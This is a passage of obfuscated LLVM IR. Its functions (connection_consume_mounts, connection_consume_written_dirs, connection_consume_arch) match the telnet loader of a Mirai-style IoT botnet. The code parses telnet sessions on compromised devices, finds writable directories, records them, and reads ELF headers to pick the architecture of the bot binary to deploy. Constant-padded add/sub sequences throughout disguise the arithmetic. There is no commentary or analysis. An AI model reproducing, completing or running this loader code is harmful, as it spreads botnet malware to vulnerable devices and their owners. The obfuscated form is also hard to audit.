  br i1 %241, label %258, label %242

; <label>:242:                                    ; preds = %234, %226
  %243 = load i8*, i8** %11, align 8
  %244 = load i32, i32* %7, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8, i8* %243, i64 %245
  %247 = load i8, i8* %246, align 1
  %248 = sext i8 %247 to i32
  %249 = icmp sge i32 %248, 65
  br i1 %249, label %250, label %264

; <label>:250:                                    ; preds = %242
  %251 = load i8*, i8** %11, align 8
  %252 = load i32, i32* %7, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i8, i8* %251, i64 %253
  %255 = load i8, i8* %254, align 1
  %256 = sext i8 %255 to i32
  %257 = icmp sle i32 %256, 90
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %250, %234
  %259 = load i32, i32* %15, align 4
  %260 = add i32 %259, 532529559
  %261 = add i32 %260, 1
  %262 = sub i32 %261, 532529559
  %263 = add nsw i32 %259, 1
  store i32 %262, i32* %15, align 4
  br label %271

; <label>:264:                                    ; preds = %250, %242
  br label %265

; <label>:265:                                    ; preds = %264, %220
  br label %266

; <label>:266:                                    ; preds = %265
  %267 = load i32, i32* %7, align 4
  %268 = sub i32 0, 1
  %269 = sub i32 %267, %268
  %270 = add nsw i32 %267, 1
  store i32 %269, i32* %7, align 4
  br label %200

; <label>:271:                                    ; preds = %258, %200
  %272 = load i32, i32* %15, align 4
  %273 = icmp eq i32 %272, 0
  br i1 %273, label %274, label %283

; <label>:274:                                    ; preds = %271
  %275 = load i32, i32* %14, align 4
  %276 = icmp sgt i32 %275, 0
  br i1 %276, label %277, label %283

; <label>:277:                                    ; preds = %274
  %278 = load %struct.connection*, %struct.connection** %3, align 8
  %279 = getelementptr inbounds %struct.connection, %struct.connection* %278, i32 0, i32 4
  %280 = load i32, i32* %279, align 8
  %281 = load i32, i32* %12, align 4
  %282 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %280, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %281)
  br label %283

; <label>:283:                                    ; preds = %277, %274, %271
  br label %284

; <label>:284:                                    ; preds = %283, %196
  br label %285

; <label>:285:                                    ; preds = %284, %190
  br label %286

; <label>:286:                                    ; preds = %285, %171, %168
  %287 = load %struct.connection*, %struct.connection** %3, align 8
  %288 = getelementptr inbounds %struct.connection, %struct.connection* %287, i32 0, i32 15
  %289 = getelementptr inbounds [8192 x i8], [8192 x i8]* %288, i32 0, i32 0
  %290 = load i32, i32* %6, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8, i8* %289, i64 %291
  %293 = getelementptr inbounds i8, i8* %292, i64 1
  store i8* %293, i8** %5, align 8
  br label %294

; <label>:294:                                    ; preds = %286, %56
  br label %295

; <label>:295:                                    ; preds = %294, %50
  br label %296

; <label>:296:                                    ; preds = %295
  %297 = load i32, i32* %6, align 4
  %298 = sub i32 %297, -467181590
  %299 = add i32 %298, 1
  %300 = add i32 %299, -467181590
  %301 = add nsw i32 %297, 1
  store i32 %300, i32* %6, align 4
  br label %27

; <label>:302:                                    ; preds = %38
  %303 = load i32, i32* %4, align 4
  %304 = icmp eq i32 %303, -1
  br i1 %304, label %305, label %337

; <label>:305:                                    ; preds = %302
  %306 = load %struct.connection*, %struct.connection** %3, align 8
  %307 = getelementptr inbounds %struct.connection, %struct.connection* %306, i32 0, i32 9
  %308 = load i16, i16* %307, align 8
  %309 = zext i16 %308 to i32
  %310 = icmp sgt i32 %309, 7168
  br i1 %310, label %311, label %336

; <label>:311:                                    ; preds = %305
  %312 = load %struct.connection*, %struct.connection** %3, align 8
  %313 = getelementptr inbounds %struct.connection, %struct.connection* %312, i32 0, i32 15
  %314 = getelementptr inbounds [8192 x i8], [8192 x i8]* %313, i32 0, i32 0
  %315 = load %struct.connection*, %struct.connection** %3, align 8
  %316 = getelementptr inbounds %struct.connection, %struct.connection* %315, i32 0, i32 15
  %317 = getelementptr inbounds [8192 x i8], [8192 x i8]* %316, i32 0, i32 0
  %318 = getelementptr inbounds i8, i8* %317, i64 6144
  %319 = load %struct.connection*, %struct.connection** %3, align 8
  %320 = getelementptr inbounds %struct.connection, %struct.connection* %319, i32 0, i32 9
  %321 = load i16, i16* %320, align 8
  %322 = zext i16 %321 to i32
  %323 = add i32 %322, -662767987
  %324 = sub i32 %323, 6144
  %325 = sub i32 %324, -662767987
  %326 = sub nsw i32 %322, 6144
  %327 = sext i32 %325 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %314, i8* %318, i64 %327, i32 1, i1 false)
  %328 = load %struct.connection*, %struct.connection** %3, align 8
  %329 = getelementptr inbounds %struct.connection, %struct.connection* %328, i32 0, i32 9
  %330 = load i16, i16* %329, align 8
  %331 = zext i16 %330 to i32
  %332 = sub i32 0, 6144
  %333 = add i32 %331, %332
  %334 = sub nsw i32 %331, 6144
  %335 = trunc i32 %333 to i16
  store i16 %335, i16* %329, align 8
  br label %336

; <label>:336:                                    ; preds = %311, %305
  store i32 0, i32* %2, align 4
  br label %369

; <label>:337:                                    ; preds = %302
  store i32 0, i32* %6, align 4
  br label %338

; <label>:338:                                    ; preds = %361, %337
  %339 = load i32, i32* %6, align 4
  %340 = load %struct.connection*, %struct.connection** %3, align 8
  %341 = getelementptr inbounds %struct.connection, %struct.connection* %340, i32 0, i32 9
  %342 = load i16, i16* %341, align 8
  %343 = zext i16 %342 to i32
  %344 = icmp slt i32 %339, %343
  br i1 %344, label %345, label %367

; <label>:345:                                    ; preds = %338
  %346 = load %struct.connection*, %struct.connection** %3, align 8
  %347 = getelementptr inbounds %struct.connection, %struct.connection* %346, i32 0, i32 15
  %348 = load i32, i32* %6, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds [8192 x i8], [8192 x i8]* %347, i64 0, i64 %349
  %351 = load i8, i8* %350, align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 0
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %345
  %355 = load %struct.connection*, %struct.connection** %3, align 8
  %356 = getelementptr inbounds %struct.connection, %struct.connection* %355, i32 0, i32 15
  %357 = load i32, i32* %6, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds [8192 x i8], [8192 x i8]* %356, i64 0, i64 %358
  store i8 32, i8* %359, align 1
  br label %360

; <label>:360:                                    ; preds = %354, %345
  br label %361

; <label>:361:                                    ; preds = %360
  %362 = load i32, i32* %6, align 4
  %363 = add i32 %362, 1368815354
  %364 = add i32 %363, 1
  %365 = sub i32 %364, 1368815354
  %366 = add nsw i32 %362, 1
  store i32 %365, i32* %6, align 4
  br label %338

; <label>:367:                                    ; preds = %338
  %368 = load i32, i32* %4, align 4
  store i32 %368, i32* %2, align 4
  br label %369

; <label>:369:                                    ; preds = %367, %336
  %370 = load i32, i32* %2, align 4
  ret i32 %370
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_mounts(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca [256 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %8, align 4
  %19 = load i32, i32* %8, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %182

; <label>:22:                                     ; preds = %1
  store i32 0, i32* %7, align 4
  br label %23

; <label>:23:                                     ; preds = %167, %22
  %24 = load i32, i32* %7, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %172

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 255
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  br label %172

; <label>:32:                                     ; preds = %27
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 10
  br i1 %40, label %41, label %101

; <label>:41:                                     ; preds = %32
  %42 = load i32, i32* %5, align 4
  %43 = sub i32 0, 1
  %44 = sub i32 %42, %43
  %45 = add nsw i32 %42, 1
  store i32 %44, i32* %5, align 4
  %46 = sext i32 %42 to i64
  %47 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %46
  store i8 0, i8* %47, align 1
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i32 0, i32 0
  %49 = call i8* @strtok(i8* %48, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %50 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %50, i8** %9, align 8
  %51 = icmp eq i8* %50, null
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %41
  br label %100

; <label>:53:                                     ; preds = %41
  %54 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %57

; <label>:56:                                     ; preds = %53
  br label %100

; <label>:57:                                     ; preds = %53
  %58 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %58, i8** %10, align 8
  %59 = icmp eq i8* %58, null
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %57
  br label %100

; <label>:61:                                     ; preds = %57
  %62 = load i8*, i8** %9, align 8
  %63 = load i8*, i8** %9, align 8
  %64 = call i64 @strlen(i8* %63) #6
  %65 = add i64 %64, 7076686665078678066
  %66 = sub i64 %65, 1
  %67 = sub i64 %66, 7076686665078678066
  %68 = sub i64 %64, 1
  %69 = getelementptr inbounds i8, i8* %62, i64 %67
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp eq i32 %71, 47
  br i1 %72, label %73, label %82

; <label>:73:                                     ; preds = %61
  %74 = load i8*, i8** %9, align 8
  %75 = load i8*, i8** %9, align 8
  %76 = call i64 @strlen(i8* %75) #6
  %77 = add i64 %76, 8355968241655308103
  %78 = sub i64 %77, 1
  %79 = sub i64 %78, 8355968241655308103
  %80 = sub i64 %76, 1
  %81 = getelementptr inbounds i8, i8* %74, i64 %79
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %73, %61
  %83 = load i8*, i8** %10, align 8
  %84 = load i8*, i8** %10, align 8
  %85 = call i64 @strlen(i8* %84) #6
  %86 = trunc i64 %85 to i32
  %87 = call i32 @util_memsearch(i8* %83, i32 %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i32 2)
  %88 = icmp ne i32 %87, -1
  br i1 %88, label %89, label %99

; <label>:89:                                     ; preds = %82
  %90 = load %struct.connection*, %struct.connection** %3, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = load i8*, i8** %9, align 8
  %94 = load i8*, i8** %9, align 8
  %95 = load i8*, i8** %9, align 8
  %96 = load i8*, i8** %9, align 8
  %97 = load i8*, i8** %9, align 8
  %98 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %92, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* %93, i8* %94, i8* %95, i8* %96, i8* %97)
  br label %99

; <label>:99:                                     ; preds = %89, %82
  br label %100

; <label>:100:                                    ; preds = %99, %60, %56, %52
  store i32 0, i32* %5, align 4
  br label %166

; <label>:101:                                    ; preds = %32
  %102 = load %struct.connection*, %struct.connection** %3, align 8
  %103 = getelementptr inbounds %struct.connection, %struct.connection* %102, i32 0, i32 15
  %104 = load i32, i32* %7, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [8192 x i8], [8192 x i8]* %103, i64 0, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 32
  br i1 %109, label %119, label %110

; <label>:110:                                    ; preds = %101
  %111 = load %struct.connection*, %struct.connection** %3, align 8
  %112 = getelementptr inbounds %struct.connection, %struct.connection* %111, i32 0, i32 15
  %113 = load i32, i32* %7, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [8192 x i8], [8192 x i8]* %112, i64 0, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 9
  br i1 %118, label %119, label %140

; <label>:119:                                    ; preds = %110, %101
  %120 = load i32, i32* %6, align 4
  %121 = sub i32 0, 1
  %122 = sub i32 %120, %121
  %123 = add nsw i32 %120, 1
  store i32 %122, i32* %6, align 4
  %124 = icmp eq i32 %120, 0
  br i1 %124, label %125, label %139

; <label>:125:                                    ; preds = %119
  %126 = load %struct.connection*, %struct.connection** %3, align 8
  %127 = getelementptr inbounds %struct.connection, %struct.connection* %126, i32 0, i32 15
  %128 = load i32, i32* %7, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [8192 x i8], [8192 x i8]* %127, i64 0, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = load i32, i32* %5, align 4
  %133 = sub i32 %132, 411051566
  %134 = add i32 %133, 1
  %135 = add i32 %134, 411051566
  %136 = add nsw i32 %132, 1
  store i32 %135, i32* %5, align 4
  %137 = sext i32 %132 to i64
  %138 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %137
  store i8 %131, i8* %138, align 1
  br label %139

; <label>:139:                                    ; preds = %125, %119
  br label %165

; <label>:140:                                    ; preds = %110
  %141 = load %struct.connection*, %struct.connection** %3, align 8
  %142 = getelementptr inbounds %struct.connection, %struct.connection* %141, i32 0, i32 15
  %143 = load i32, i32* %7, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [8192 x i8], [8192 x i8]* %142, i64 0, i64 %144
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp ne i32 %147, 13
  br i1 %148, label %149, label %164

; <label>:149:                                    ; preds = %140
  store i32 0, i32* %6, align 4
  %150 = load %struct.connection*, %struct.connection** %3, align 8
  %151 = getelementptr inbounds %struct.connection, %struct.connection* %150, i32 0, i32 15
  %152 = load i32, i32* %7, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [8192 x i8], [8192 x i8]* %151, i64 0, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = load i32, i32* %5, align 4
  %157 = sub i32 0, %156
  %158 = sub i32 0, 1
  %159 = add i32 %157, %158
  %160 = sub i32 0, %159
  %161 = add nsw i32 %156, 1
  store i32 %160, i32* %5, align 4
  %162 = sext i32 %156 to i64
  %163 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %162
  store i8 %155, i8* %163, align 1
  br label %164

; <label>:164:                                    ; preds = %149, %140
  br label %165

; <label>:165:                                    ; preds = %164, %139
  br label %166

; <label>:166:                                    ; preds = %165, %100
  br label %167

; <label>:167:                                    ; preds = %166
  %168 = load i32, i32* %7, align 4
  %169 = sub i32 0, 1
  %170 = sub i32 %168, %169
  %171 = add nsw i32 %168, 1
  store i32 %170, i32* %7, align 4
  br label %23

; <label>:172:                                    ; preds = %31, %23
  %173 = load %struct.connection*, %struct.connection** %3, align 8
  %174 = getelementptr inbounds %struct.connection, %struct.connection* %173, i32 0, i32 4
  %175 = load i32, i32* %174, align 8
  %176 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %175, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0))
  %177 = load %struct.connection*, %struct.connection** %3, align 8
  %178 = getelementptr inbounds %struct.connection, %struct.connection* %177, i32 0, i32 4
  %179 = load i32, i32* %178, align 8
  %180 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %179, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i32 0, i32 0))
  %181 = load i32, i32* %8, align 4
  store i32 %181, i32* %2, align 4
  br label %182

; <label>:182:                                    ; preds = %172, %21
  %183 = load i32, i32* %2, align 4
  ret i32 %183
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %7, align 4
  store i8 0, i8* %8, align 1
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %4, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %106

; <label>:21:                                     ; preds = %1
  br label %22

; <label>:22:                                     ; preds = %103, %55, %21
  %23 = load %struct.connection*, %struct.connection** %3, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 15
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i32 0, i32 0
  %26 = load i32, i32* %7, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %4, align 4
  %30 = load i32, i32* %7, align 4
  %31 = add i32 %29, 1465389928
  %32 = sub i32 %31, %30
  %33 = sub i32 %32, 1465389928
  %34 = sub nsw i32 %29, %30
  %35 = call i32 @util_memsearch(i8* %28, i32 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i32 0, i32 0), i32 4)
  store i32 %35, i32* %6, align 4
  %36 = load i32, i32* %6, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %22
  br label %104

; <label>:39:                                     ; preds = %22
  %40 = load i32, i32* %6, align 4
  %41 = load i32, i32* %7, align 4
  %42 = sub i32 %41, 2000198836
  %43 = add i32 %42, %40
  %44 = add i32 %43, 2000198836
  %45 = add nsw i32 %41, %40
  store i32 %44, i32* %7, align 4
  %46 = load %struct.connection*, %struct.connection** %3, align 8
  %47 = getelementptr inbounds %struct.connection, %struct.connection* %46, i32 0, i32 15
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %47, i32 0, i32 0
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = call i8* @strtok(i8* %51, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0)) #5
  store i8* %52, i8** %9, align 8
  %53 = load i8*, i8** %9, align 8
  %54 = icmp eq i8* %53, null
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %39
  br label %22

; <label>:56:                                     ; preds = %39
  %57 = load i8*, i8** %9, align 8
  %58 = call i64 @strlen(i8* %57) #6
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %10, align 4
  %60 = load i8*, i8** %9, align 8
  %61 = load i32, i32* %10, align 4
  %62 = sub i32 %61, 519315118
  %63 = sub i32 %62, 1
  %64 = add i32 %63, 519315118
  %65 = sub nsw i32 %61, 1
  %66 = sext i32 %64 to i64
  %67 = getelementptr inbounds i8, i8* %60, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = icmp eq i32 %69, 13
  br i1 %70, label %71, label %80

; <label>:71:                                     ; preds = %56
  %72 = load i8*, i8** %9, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add i32 %73, -773823521
  %75 = sub i32 %74, 1
  %76 = sub i32 %75, -773823521
  %77 = sub nsw i32 %73, 1
  %78 = sext i32 %76 to i64
  %79 = getelementptr inbounds i8, i8* %72, i64 %78
  store i8 0, i8* %79, align 1
  br label %80

; <label>:80:                                     ; preds = %71, %56
  %81 = load %struct.connection*, %struct.connection** %3, align 8
  %82 = getelementptr inbounds %struct.connection, %struct.connection* %81, i32 0, i32 4
  %83 = load i32, i32* %82, align 8
  %84 = load i8*, i8** %9, align 8
  %85 = load i8*, i8** %9, align 8
  %86 = load i8*, i8** %9, align 8
  %87 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %83, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i32 0, i32 0), i8* %84, i8* %85, i8* %86)
  %88 = load i8, i8* %8, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %103, label %90

; <label>:90:                                     ; preds = %80
  %91 = load i32, i32* %10, align 4
  %92 = icmp slt i32 %91, 31
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %90
  %94 = load %struct.connection*, %struct.connection** %3, align 8
  %95 = getelementptr inbounds %struct.connection, %struct.connection* %94, i32 0, i32 3
  %96 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %95, i32 0, i32 3
  %97 = getelementptr inbounds [32 x i8], [32 x i8]* %96, i32 0, i32 0
  %98 = load i8*, i8** %9, align 8
  %99 = call i8* @strcpy(i8* %97, i8* %98) #5
  store i8 1, i8* %8, align 1
  br label %102

; <label>:100:                                    ; preds = %90
  %101 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %101)
  br label %102

; <label>:102:                                    ; preds = %100, %93
  br label %103

; <label>:103:                                    ; preds = %102, %80
  br label %22

; <label>:104:                                    ; preds = %38
  %105 = load i32, i32* %4, align 4
  store i32 %105, i32* %2, align 4
  br label %106

; <label>:106:                                    ; preds = %104, %20
  %107 = load i32, i32* %2, align 4
  ret i32 %107
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_copy_op(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 3
  %9 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %8, i32 0, i32 8
  %10 = load i8, i8* %9, align 1
  %11 = icmp ne i8 %10, 0
  br i1 %11, label %220, label %12

; <label>:12:                                     ; preds = %1
  %13 = load %struct.connection*, %struct.connection** %3, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 15
  %15 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i32 0, i32 0
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 9
  %18 = load i16, i16* %17, align 8
  %19 = zext i16 %18 to i32
  %20 = call i32 @util_memsearch(i8* %15, i32 %19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i32 0, i32 0), i32 3)
  store i32 %20, i32* %5, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %12
  store i32 0, i32* %2, align 4
  br label %265

; <label>:23:                                     ; preds = %12
  %24 = load i32, i32* %5, align 4
  %25 = add i32 %24, 890705254
  %26 = sub i32 %25, 4
  %27 = sub i32 %26, 890705254
  %28 = sub nsw i32 %24, 4
  store i32 %27, i32* %5, align 4
  %29 = load %struct.connection*, %struct.connection** %3, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 15
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i32 0, i32 0
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = bitcast i8* %34 to %struct.elf_hdr*
  store %struct.elf_hdr* %35, %struct.elf_hdr** %4, align 8
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 3
  %38 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %37, i32 0, i32 8
  store i8 1, i8* %38, align 1
  %39 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %40 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %39, i32 0, i32 0
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %40, i64 0, i64 5
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  switch i32 %43, label %55 [
    i32 0, label %44
    i32 2, label %45
    i32 1, label %54
  ]

; <label>:44:                                     ; preds = %23
  store i32 0, i32* %2, align 4
  br label %265

; <label>:45:                                     ; preds = %23
  %46 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %47 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %46, i32 0, i32 2
  %48 = load i16, i16* %47, align 1
  %49 = zext i16 %48 to i32
  %50 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %49)
  %51 = trunc i32 %50 to i16
  %52 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %53 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %52, i32 0, i32 2
  store i16 %51, i16* %53, align 1
  br label %55

; <label>:54:                                     ; preds = %23
  br label %55

; <label>:55:                                     ; preds = %54, %45, %23
  %56 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %57 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %56, i32 0, i32 2
  %58 = load i16, i16* %57, align 1
  %59 = zext i16 %58 to i32
  %60 = icmp eq i32 %59, 40
  br i1 %60, label %67, label %61

; <label>:61:                                     ; preds = %55
  %62 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %63 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %62, i32 0, i32 2
  %64 = load i16, i16* %63, align 1
  %65 = zext i16 %64 to i32
  %66 = icmp eq i32 %65, 183
  br i1 %66, label %67, label %73

; <label>:67:                                     ; preds = %61, %55
